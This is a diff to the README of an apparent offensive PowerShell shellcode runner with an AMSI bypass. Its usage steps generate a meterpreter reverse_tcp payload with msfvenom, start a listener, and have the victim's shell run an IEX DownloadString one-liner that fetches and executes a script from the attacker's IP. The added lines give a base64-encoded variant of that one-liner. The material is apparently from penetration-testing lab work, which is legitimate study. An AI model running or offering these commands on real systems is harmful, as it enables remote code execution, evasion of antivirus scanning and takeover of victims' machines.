@@ -3,12 +3,11 @@ Powershell ShellCode Runner with AMSI Bypass
 
 ## Usage
 ```
-Change Line 4 in runall.ps1 to Kali's IP
+Change Line 1 in runall.ps1 to Kali's IP
 
 Host Python Webserver on Kali 
 
-Generate payload & put in line 47 of shellcoderunner.ps1
-
+Generate payload & put in line 44 of shellcoderunner.ps1
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f powershell
 
 Start Msfconsole listener
@@ -17,6 +16,9 @@ Start Msfconsole listener
 In victim's cmd shell
     powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1')
 
+OR encoded powershell command
+    IEX (New-Object Net.WebClient).DownloadString('http://192.168.61.128/runall.ps1') save to to_encode.txt 
+    python b64encode.py to_encode.txt 
 ```
 
 ## Source
